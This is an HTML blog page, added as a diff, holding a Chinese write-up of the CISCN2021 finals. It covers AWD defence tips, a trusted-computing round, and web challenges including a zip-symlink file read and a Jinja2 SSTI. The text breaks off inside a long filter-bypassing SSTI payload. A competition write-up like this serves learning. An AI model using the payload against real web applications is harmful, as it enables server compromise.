@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[CISCN2021]决赛居然混到了国一，队友牛逼！可信计算牛逼！ day1经典awd坐牢，对tp等大型PHP框架的审计一无所知的我只能坐牢，官方流量要延迟一小时，意味着awd只会上车的我被乱杀，一度被打到倒数前十。但其实web也能自力更生的抓流量，但这回因为未知的原因，祖传脚本未能抓到流量，经过长达一个小时的边挨打边修边研究，发现是祖传脚本默认把流量写入tmp目录，而不知为何tmp目录不能写造成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CISCN2021]决赛">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[CISCN2021]%E5%86%B3%E8%B5%9B.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[CISCN2021]决赛居然混到了国一，队友牛逼！可信计算牛逼！ day1经典awd坐牢，对tp等大型PHP框架的审计一无所知的我只能坐牢，官方流量要延迟一小时，意味着awd只会上车的我被乱杀，一度被打到倒数前十。但其实web也能自力更生的抓流量，但这回因为未知的原因，祖传脚本未能抓到流量，经过长达一个小时的边挨打边修边研究，发现是祖传脚本默认把流量写入tmp目录，而不知为何tmp目录不能写造成">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-07-20T06:26:06.000Z">
+<meta property="article:modified_time" content="2021-08-31T08:54:31.965Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[CISCN2021]%E5%86%B3%E8%B5%9B.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[CISCN2021]决赛 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[CISCN2021]%E5%86%B3%E8%B5%9B.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [CISCN2021]决赛
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-07-20 14:26:06" itemprop="dateCreated datePublished" datetime="2021-07-20T14:26:06+08:00">2021-07-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-31 16:54:31" itemprop="dateModified" datetime="2021-08-31T16:54:31+08:00">2021-08-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BCISCN2021%5D%E5%86%B3%E8%B5%9B.html" class="post-meta-item leancloud_visitors" data-flag-title="[CISCN2021]决赛" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BCISCN2021%5D%E5%86%B3%E8%B5%9B.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BCISCN2021%5D%E5%86%B3%E8%B5%9B.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CISCN2021-决赛"><a href="#CISCN2021-决赛" class="headerlink" title="[CISCN2021]决赛"></a>[CISCN2021]决赛</h1><p>居然混到了国一，队友牛逼！可信计算牛逼！</p>
+<h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p>经典awd坐牢，对tp等大型PHP框架的审计一无所知的我只能坐牢，官方流量要延迟一小时，意味着awd只会上车的我被乱杀，一度被打到倒数前十。但其实web也能自力更生的抓流量，但这回因为未知的原因，祖传脚本未能抓到流量，经过长达一个小时的边挨打边修边研究，发现是祖传脚本默认把流量写入tmp目录，而不知为何tmp目录不能写造成的。<br>查看phpinfo，disable_fucntion禁用了system，exec等命令执行函数，让写入不死马的几率降低到最小，open_basedir并没有值，那么应该不会影响到写入tmp，查看tmp权限，经典777+t，那么也不会影响写入。最后，为什么写不了tmp成为了一个永远的未解之谜。<br>然后挨了一个小时打之后发现流量能写本地，然后就开始上车，但这个时候的垃圾洞已经被修的差不多了，捡垃圾也只能捡一点点分，成功进入倒数前十。</p>
+<p>还是记录一下踩的坑吧。</p>
+<h3 id="祖传抓流量脚本不能用"><a href="#祖传抓流量脚本不能用" class="headerlink" title="祖传抓流量脚本不能用"></a>祖传抓流量脚本不能用</h3><p>就是刚才说的祖传waf因为不知名原因无法写tmp，但可以写当前目录下，改了一下又能勉勉强强的跑起来。但是写当前目录不知道是就直接填个<code>.</code>呢还是填个<code>/var/www/html/</code>比较保险呢？填个<code>.</code>不需要额外思考，但是只对tp这种单页入口的好用，如果是那种每个文件都是入口的简单PHP文件堆，还得批量挂载，并且每个文件的执行目录不一样，就会导致日志写的到处都是？但是我不清楚这回写不了tmp但是能写当前目录是什么原因，不知道填了绝对路径会不会出问题？</p>
+<h3 id="改密码！！！"><a href="#改密码！！！" class="headerlink" title="改密码！！！"></a>改密码！！！</h3><p>如果感觉ssh密码有点毛病，就把ssh密码也给改了，免得收到ssh攻击。。。。<br>一定要翻一翻配置文件找数据库密码和后台管理员密码！迅速改掉跑路，很多洞都是来自于直接登录你管理员后台，改模板上传马关站之类的，分区赛也是被登了后台，一次是关了站，一次是改了模板，直接把我flag放到首页了。。这次也一样，被登录了后台然后被疯狂传马，还有一个站是登录后台然后改我模板，主页变空白后check不过，也是挨打。这种情况还可能会遇到主机上没有mysql客户端，没法终端改数据库密码，那就只能从网站代码找接口，但是有时候网站管理员密码也找不到，就在配置文件里找到一个mysql密码，但是又连不上，急死<br>所以这次学会了一个新把戏，adminer.php，这个玩意单个文件就包含了完整的数据库管理功能，小phpmyadmin</p>
+<h3 id="准备二进制工具"><a href="#准备二进制工具" class="headerlink" title="准备二进制工具"></a>准备二进制工具</h3><p>python脚本固然好用，可是，万一目标机器没有python环境呢？当场暴毙是完全可能的，所以成熟的赛棍都会使用强力的pyinstaller把脚本和解释器第三方库全部超级打包到二进制，这样就能随便跑了，把我也本地整一个，到时候要python脚本的时候就能打包<br>不过这里注意pyinstaller并不能跨平台，所以应该在虚拟机上打一个包，然后才能在Linux目标机器上运行</p>
+<h3 id="可信计算"><a href="#可信计算" class="headerlink" title="可信计算"></a>可信计算</h3><p>可信计算牛逼！！！<br>没这个可信计算今年就人生有梦各自精彩了。题目并不难，总的来说就是看懂代码在干什么，然后填空，初看觉得完全看不懂，但是大概看懂情况之后就能做出来了，并且有很贴心的注释，整体代码不是很复杂，并且大部分函数都已经实现了，只需要对着要求去找函数复制粘贴一下就能搞定，每个题的工作量可能只有十行不到的代码。一个小时狂砍3w分完成翻盘</p>
+<h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p>ctf，先打再修，经典赛制<br>四个web看了两个一个没出嘻嘻</p>
+<p>buu上了国赛复现，所以又再补充一点</p>
+<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>有一个上传功能，然后写着你是admin就会告诉你写什么东西，cookie看起来像是jwt那类的，把第一段base64解码一下，username guest。需要伪造cookie，验证了一下是flask那种的cookie，所以一个可能性是爆破密钥，但是没有工具，让队友去下，没找到这种爆破工具，试一试上传点。这种上传一般来说都给传图片，先传个png试试。502bad gateway？不会，告辞</p>
+<p>赛后ssh上去看了一眼，发现是能传zip，第一反应是以前见过的一个传zip软链接进行任意文件读取，估计是考的这个点，但是那个时候的我还没意识到问题的严重性<br>直到队友在pyc里面看到了hctf字样，我才知道这铁原题，搜了一下，zip传软链接任意文件读取就是hctf2018里面的原题，我知道有软链接任意读这么一回事，但我并没有去看那个原题，上网机一搜，好家伙，除了题目名字一个字没改，铁原题。</p>
+<p>修复方案，比较合理的方案是检查解压缩之后是不是有软链接，不读取软链接，但是比赛时不方便查东西，并不知道怎么实现，由于题目最后伪造admin session靠的是伪造密钥，而密钥是由Mac地址为种子产生的随机数，因此通过读Mac地址打通的，这里把随机数改成个其他的uuid之类的定值就行了</p>
+<p>用zip保留软链接的打包需要添加一个<code>-y</code>参数</p>
+<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>一个登陆界面，随便测一下，测半天没反应，回显一直是404，没找到注入点，然后随便换了个路由，看看能不能注册，结果发现改了之后，原来tab上的login not found变成了register not found，不会是这里ssti吧。<br>测了一下还真是。。。只能说略微的有点诡异，简单试了一下发现过滤了数字和join，并且只在双大括号内过滤。试了一下引号，直接500，我一度以为应该是我的语法有问题，但实际上我也不知道怎么回事，最后就权当他过滤了引号吧。那么就大概是过滤了数字和引号的ssti，把以前的payload翻出来改改</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20pc<span class="token operator">=</span>g<span class="token operator">|</span>lower<span class="token operator">|</span>list<span class="token operator">|</span>first<span class="token operator">|</span>urlencode<span class="token operator">|</span>first<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20c</span><span class="token operator">=</span>g<span class="token operator">|</span>lower<span class="token operator">|</span>list<span class="token operator">|</span>first<span class="token operator">|</span>urlencode<span class="token operator">|</span>last<span class="token operator">|</span>lower<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20zero<span class="token operator">=</span><span class="token boolean">True</span><span class="token operator">-</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20one<span class="token operator">=</span><span class="token boolean">True</span><span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">-</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20two<span class="token operator">=</span><span class="token boolean">True</span><span class="token operator">%</span>2bTrue<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20three<span class="token operator">=</span>two<span class="token operator">%</span>2bTrue<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20four<span class="token operator">=</span>three<span class="token operator">%</span>2bTrue<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20five<span class="token operator">=</span>four<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20six<span class="token operator">=</span>five<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20seven<span class="token operator">=</span>six<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20eight<span class="token operator">=</span>seven<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20nine<span class="token operator">=</span>eight<span class="token operator">+</span><span class="token boolean">True</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20udl<span class="token operator">=</span><span class="token punctuation">(</span>pc<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20xhx<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">|</span>string<span class="token punctuation">,</span>five<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20a</span><span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">|</span>string<span class="token punctuation">,</span>seven<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20b</span><span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">|</span>string<span class="token punctuation">,</span>eight<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20d</span><span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span><span class="token number">20e</span><span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20g<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>three<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20i<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>five<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20l<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>eight<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20m<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">,</span>nine<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20n<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>zero<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20o<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20p<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>two<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20r<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>four<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20s<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>five<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20t<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>six<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20u<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>seven<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20v<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>eight<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20w<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>nine<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20y<span class="token operator">=</span>udl<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one<span class="token operator">|</span>string<span class="token punctuation">,</span>two<span class="token operator">|</span>string<span class="token punctuation">,</span>one<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">|</span>int<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20class<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>c<span class="token punctuation">,</span>l<span class="token punctuation">,</span>a<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20init<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">,</span>i<span class="token punctuation">,</span>t<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>set<span class="token operator">%</span>20global<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>g<span class="token punctuation">,</span>l<span class="token punctuation">,</span>o<span class="token punctuation">,</span>b<span class="token punctuation">,</span>a<span class="token 